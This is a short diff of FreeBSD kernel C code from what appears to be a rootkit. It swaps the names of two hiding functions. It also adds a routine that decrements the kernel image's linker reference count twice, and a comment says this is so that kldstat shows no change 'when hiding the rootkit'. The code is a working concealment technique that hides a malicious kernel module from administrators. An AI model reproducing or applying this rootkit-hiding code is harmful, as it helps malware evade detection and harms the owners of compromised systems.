@@ -54,7 +54,7 @@ struct module {
 };
 
 void
-hide_kld(char *kld_name)
+hide_ko(char *kld_name)
 {
 	struct module *mod;
 
@@ -74,8 +74,14 @@ hide_kld(char *kld_name)
 	sx_xunlock(&modules_sx);
 }
 
+static void
+decrement_kernel_image_ref_count(void)
+{
+	(&linker_files)->tqh_first->refs--;
+}
+
 void
-hide_ko(char *ko_name)
+hide_kld(char *ko_name)
 {
 	struct linker_file *lf;
 
@@ -92,6 +98,11 @@ hide_ko(char *ko_name)
 			break;
 		}
 	}
+
+	/* Must decrement twice for kldstat to return no changes
+	 * when hiding the rootkit. */
+	decrement_kernel_image_ref_count();
+	decrement_kernel_image_ref_count();
 
 	sx_unlock(&kld_sx);
 	mtx_unlock(&Giant);
